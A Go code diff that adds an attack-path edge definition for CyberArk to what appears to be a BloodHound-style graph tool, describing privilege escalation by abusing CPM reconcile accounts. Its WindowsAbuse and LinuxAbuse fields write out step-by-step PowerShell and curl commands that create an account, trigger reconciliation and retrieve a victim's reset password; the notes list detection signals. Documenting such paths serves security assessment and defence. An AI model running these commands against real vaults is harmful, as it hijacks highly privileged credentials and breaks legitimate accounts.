@@ -191,6 +191,44 @@ var EdgeInfoMap = map[string]EdgeInfo{
 			"https://docs.cyberark.com/credential-providers/latest/en/content/cp%20and%20ascp/application-details.htm",
 		},
 	},
+	"CyberArk_CanHijackViaReconcile": {
+		Description: "The source principal holds account-management permission (addAccounts and/or manageSafe) on the safe named in viaSafe, and that safe contains accounts whose platform defines the target account as its privileged reconcile account. " +
+			"By creating a new account (or redirecting an existing one) on that platform and pointing it at a chosen target system/identity, the principal causes the CPM to use the reconcile account to reset the target's password to a value stored in the Vault — which the principal can then retrieve. " +
+			"The reconcile account is typically a highly privileged credential (e.g. a domain admin), so this is a privilege-escalation edge: its blast radius is whatever the reconcile account is authorized to reset (follow the reconcile account's own CyberArk_SyncsToADUser / CyberArk_CanConnect edges). " +
+			"Tradecraft credit: Marat Nigmatullin (@_mnigma_, FalconForce) — \"4 GET requests = 3 Domain admins: CyberArk magic you didn't know about\", SO-CON 2026.",
+		WindowsAbuse: "On a platform that uses the target reconcile account, create an account that points at the victim, then drive CPM reconciliation so the reconcile credential resets the victim's password:\n\n" +
+			"$pvwaURL = 'https://<pvwa>'\n" +
+			"$headers = @{Authorization = \"Bearer $token\"}\n" +
+			"# 1. Add an account on the reconcile-enabled platform, addressed at the target:\n" +
+			"$body = @{\n" +
+			"    safeName   = '<viaSafe>'\n" +
+			"    platformId = '<reconcileEnabledPlatform>'\n" +
+			"    userName   = '<target-account>'\n" +
+			"    address    = '<target-host-or-domain>'\n" +
+			"    secretType = 'password'\n" +
+			"} | ConvertTo-Json\n" +
+			"$acct = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts\" -Method POST -Headers $headers -Body $body -ContentType 'application/json'\n\n" +
+			"# 2. Trigger reconciliation (the CPM uses the privileged reconcile account to reset the target):\n" +
+			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/$($acct.id)/Reconcile\" -Method POST -Headers $headers\n\n" +
+			"# 3. Retrieve the now-known target password:\n" +
+			"Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/$($acct.id)/Password/Retrieve\" -Method POST -Headers $headers -Body '{}' -ContentType 'application/json'",
+		LinuxAbuse: "Same primitive with curl — add an account on the reconcile-enabled platform addressed at the victim, reconcile, then retrieve:\n\n" +
+			"# 1. Create the account\n" +
+			"curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts\" -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\\n" +
+			"  -d '{\"safeName\":\"<viaSafe>\",\"platformId\":\"<reconcileEnabledPlatform>\",\"userName\":\"<target-account>\",\"address\":\"<target-host-or-domain>\",\"secretType\":\"password\"}'\n\n" +
+			"# 2. Reconcile (uses the privileged reconcile account)\n" +
+			"curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Reconcile\" -H \"Authorization: Bearer $TOKEN\"\n\n" +
+			"# 3. Retrieve the reset target password\n" +
+			"curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' -d '{}'",
+		OpsecNotes: "This is destructive: it RESETS the target account's password, which will break any legitimate use of that account and is highly visible in the target system's logs (e.g. Windows 4724/4738 password-reset events) and in the CyberArk audit trail. " +
+			"Account creation, the reconcile operation, and the password retrieval are all logged under the acting user. Use only in a lab or with explicit change-controlled authorization. " +
+			"The reconcile account is normally used only by the CPM — human-initiated reconciliation against an unexpected target is a strong detection opportunity.",
+		References: []string{
+			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/defining-reconcile-account.htm",
+			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/rest-api-reconcile-account.htm",
+			"https://github.com/SpecterOps/presentations/tree/main/SO-CON%202026",
+		},
+	},
 	"CyberArk_MemberOf": {
 		Description: "The source CyberArk user or group is a member of the target CyberArk group. " +
 			"Group membership is cumulative: a user inherits all permissions granted to every group they belong to across all safes. " +
